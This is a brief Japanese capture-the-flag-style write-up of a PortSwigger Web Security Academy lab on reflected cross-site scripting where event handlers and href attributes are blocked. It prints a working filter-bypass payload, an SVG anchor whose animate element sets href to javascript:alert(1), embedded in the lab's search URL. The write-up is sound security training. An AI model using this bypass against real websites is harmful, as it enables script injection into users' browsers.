# イベントハンドラと href 属性をブロックした XSS の反映

次のハッキングラボを実施します  
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked

- 1. ハッキングラボにアクセスします
- 2. 検索窓に以下を入力して検索します

```js
<script>alert(1)</scripy>
```

以下のメッセージが表示されます

```
"Tag is not allowed"
```

このラボを解決するには、クリックすると関数を呼び出すベクターを挿入するクロスサイト スクリプティング alert 攻撃を実行します。

- 3. ラボの検索結果 URL にスクリプトを埋め込んだベクター画像を埋め込みます
     '''
     https://0a60007a03711e2c803b53c9009a00f2.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
     '''

- 4. コンポーネントが表示されるようになるのでクリックすると、アラートが実行されます
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/e5b00065-9713-4627-86d7-f85709dc4aad)
